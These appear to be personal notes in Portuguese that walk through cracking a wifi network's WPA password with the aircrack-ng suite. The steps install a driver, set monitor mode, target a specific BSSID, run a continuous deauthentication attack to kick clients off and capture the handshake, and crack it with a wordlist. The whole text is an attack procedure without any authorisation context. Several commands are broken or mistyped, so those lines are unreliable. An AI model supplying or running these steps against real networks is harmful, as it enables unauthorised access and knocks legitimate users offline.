git clone https://github.com/aircrack-ng/rtl8188eus

cd rtl8188eus

sudo -i

echo "blacklist r8188eu" to  "/etc/modprobe.d/realtek.conf"

exit

sudo make

sudo make install

sudo modprobe 8188eu

iwconfig

---

sudo ifconfig wlan0 down
sudo airmon-ng check kill
sudo iwconfig wlan0 mode monitor

sudo ifconfig wlan0 up
iwconfig
---
---
- pegando o bssid

sudo airodump-ng wlan0

- aqui deve ser pego o bssid e o ch (channel)

---
- verificando apenas a rede

sudo airodump-ng wlan0 -d 8C:44:4F:6E:85:02

---
- no primeiro terimnal

sudo airodump-ng -w hack1 -c 1 -d 8C:44:4F:6E:85:02
  - ou
sudo airodump-ng -w hack1 -c 1 --bssid 8C:44:4F:6E:85:02

- -w é o nome do arquivo
- -c é o ch (channel)
- -d bssid

- no segundo terminal

sudo aireplay-ng --deauth 0 -a 8C:44:4F:6E:85:02 wlan0

- entao volte no primero terminal e la deve ter adicionado algo no fim da primeira linha
- assim podemos parar o segundo terminal (Ctrl + C)
- caso nao apareca, tente conectar na rede
- assim no primeiro terminal, no fim da linha, deve ter algo como <WPA handshake> bssid>

---
- agora opdemos usar o wireshark no nosso arquivo hack1.cap
wireshark hack1.cap
---

- agora colocaremos o wlan0 em modo managed
sudo airmon-ng stop wlan0
  - ou
sudo iwconfig wlan mode managed

---

aircrack-ng hack1.cap -w /home/kali/Descktop/wordlist.txt
